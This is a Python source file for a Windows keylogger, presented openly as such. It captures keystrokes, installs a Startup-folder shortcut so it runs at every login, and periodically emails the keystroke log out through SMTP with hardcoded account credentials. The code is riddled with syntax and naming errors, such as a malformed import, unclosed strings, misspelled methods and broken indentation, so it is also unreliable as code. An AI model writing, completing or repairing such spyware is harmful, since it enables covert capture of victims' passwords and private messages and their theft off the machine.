import pynput.keyboard import Key, Listener
import os
import shutil
import datetime
import winshell
from win32com.client import Dispatch
import tempfile
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.text import MIMEBase
from email import encoders
import threading
import socket

save = tempfile.mkdtemp("screen")
print(save)
cwd = os.getcwd()
source = os.listdir()

dateAndtime = datetime.datetime.now().striftime("-%Y-%m-%d-%H-%M-%S)
filename = save+"\key_log"+dateAndtime+".txt"
open(filename,"w+")
keys=[]
count = 0                                                
countInternet = 0
word = "Key."
username = os.getLogin()

destination = r'C:\Users\{}\Appdata\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'.format(username)

def main():
    path = os.path.join.destination, "keylogger.py- Shortcut.lnk")
    target = r""+cwd+"\keylogger.py"
    icon = r""+cwd+"\keylogger.py"
    for file in source:
        if files == "keylogger.py":
            shell = Dispatch('WScript.Shell')
            shortcut = shell.CreateShortCut(path)
            shortcut.Targetpath = target
            shortcut.IconLocation = icon
            shortcut.save()

shortcut = 'keylogger.py - Shortcut.lnk'
if shortcut in destination:
    pass
else:
    main()

def is_connected():
    try:
        socket.create_connection(("www.google.com", 80))
        return True
    except OSError:
        pass
    return False

def send_email():
    fromaddr = "Keylogger.younglings@gmail.com"
    toaddr = "enter receiver email address"

    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    ms['Subject'] = "data"
    body = "TEXT YOU WANT TO SEND"
    msg.attach(MIMEText(body, 'plain'))
    attachment = open(filename, "rb")
    part = MIMEBase('application', 'octect-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= &s" % filename)
    msg.attach(part)
    server = smtplib.SMTP(Keylogger.younglings@gmail.com, 587)
    server,starttls()
    server.login(fromaddr, "password@%!!!21")
    text = msg.as_string()
    server.sendmail(fromaddr, toaddr, text)
    server.quit()

def write_file(keys):
    with open(filename,"a") as f:
        for key in keys:
            if key == 'Key.enter':
                f.write("\n")
            elif key == 'Key.space':
                f.write(key.replace("key.space"," "))
            elif key[:4] == word:
                pass
            else:
                f.write(key.replace("'","")

def on_press(key):
    global keys, count, countInternet, filename
    keys.append(str(key))
    if len(keys) > 10:
        write_file(keys)
        if is_connected():
            count += 1
            print('connected {}'.format(count))
            if count > 100:
                count = 0
                t1 = threading.Thread(target=send_email, name='t1')
                t1.start()

    else:
        countInternet += 1
        print('not connected',countInternet)
         if countInternet > 10:
            countInternet = 0
            filename = filename.strip(save)
             for files in save:
                if files == filename:
                    shutil.copy(files+"t",source)

         keys.clear()

with Listener(on_press=on_press) as listener:
    listener.join()
    
                         

